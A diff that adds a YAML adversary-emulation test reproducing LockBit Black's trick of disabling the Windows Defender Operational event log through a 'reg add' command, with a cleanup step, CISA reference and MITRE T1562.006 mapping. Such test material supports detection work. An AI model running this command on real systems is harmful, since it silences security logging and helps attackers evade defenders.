@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: LockBit Black - Disable the ETW Provider of Windows Defender -cmd
+description: |
+    An adversary can disable the ETW Provider of Windows Defender,
+    so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
+    https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
+uuid: f6df0b8e-2c83-44c7-ba5e-0fa4386bec41
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1562: Impair Defenses'
+    subtechniques:
+        - 'T1562.006: Indicator Blocking'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: lockbit-black---disable-the-etw-provider-of-windows-defender--cmd
+      inline: |
+        reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" /v Enabled /t REG_DWORD /d 0 /f
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" /v Enabled /f >nul 2>&1
+        executor: command_prompt
